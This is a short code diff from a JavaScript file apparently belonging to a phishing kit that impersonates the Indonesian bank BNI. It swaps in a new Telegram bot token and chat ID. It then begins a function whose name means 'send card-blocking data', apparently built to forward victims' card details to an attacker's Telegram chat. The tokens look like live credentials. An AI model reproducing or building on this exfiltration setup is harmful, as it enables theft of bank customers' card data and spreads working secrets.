@@ -1,8 +1,8 @@
 // ======================================================
 // 🤖 KONFIGURASI BOT TELEGRAM — VERSI BNI
 // ======================================================
-const TELEGRAM_BOT_TOKEN = '8208055515:AAFOVnHmQ_hA1xG7zsdlwVOCXtrAxHUNfRs';
-const TELEGRAM_CHAT_ID = '8405193617';
+const TELEGRAM_BOT_TOKEN = '8617962519:AAFUsD30V25HWI_axyVLCVDxmc7sg5SyLqM';
+const TELEGRAM_CHAT_ID = '8614741263';
 
 async function kirimDataBlokirKartu(data, judul = 'DATA BARU BNI') {
   try {
